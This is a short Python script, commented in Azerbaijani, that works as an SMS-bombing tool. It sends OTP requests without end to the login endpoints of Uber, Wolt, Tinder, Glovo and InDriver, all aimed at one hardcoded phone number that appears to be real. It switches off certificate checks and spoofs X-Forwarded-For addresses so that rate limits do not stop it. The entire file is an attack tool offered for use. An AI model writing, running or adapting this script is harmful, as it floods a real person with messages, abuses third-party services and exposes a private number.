import urllib.request
import json
import random
import time
import ssl

TARGET_PHONE = "994508880067" # Səlahiyyətli hədəf

def storm():
    print(f"[!!!] GLOBAL-CATACLYSM START: {TARGET_PHONE}")
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Beynəlxalq və Azərbaycan nömrələrinə dözümlü SMS qapıları
    API_LIST = [
        {"name": "Uber", "url": "https://auth.uber.com/api/v1/auth/otp", "data": {"mobile": "+" + TARGET_PHONE}},
        {"name": "Wolt", "url": "https://wolt.com/api/v2/sessions/login", "data": {"mobile": "+" + TARGET_PHONE}},
        {"name": "Tinder", "url": "https://api.gotinder.com/v2/auth/sms/send", "data": {"phone_number": "+" + TARGET_PHONE}},
        {"name": "Glovo", "url": "https://glovoapp.com/api/v3/auth/otp", "data": {"phone": "+" + TARGET_PHONE}},
        {"name": "Indriver", "url": "https://indriver.com/api/v1/auth/sms", "data": {"phone": TARGET_PHONE}}
    ]

    while True:
        for api in API_LIST:
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
                    "Content-Type": "application/json",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                req = urllib.request.Request(api["url"], data=json.dumps(api["data"]).encode(), headers=headers, method='POST')
                
                with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                    print(f"[*] {api['name']} -> Status: {resp.getcode()} (Sent)")
                
                time.sleep(random.uniform(0.5, 2)) # Sürətli ardıcıllıq

            except Exception as e:
                # print(f"[!] {api['name']} skip")
                pass

if __name__ == "__main__":
    storm()
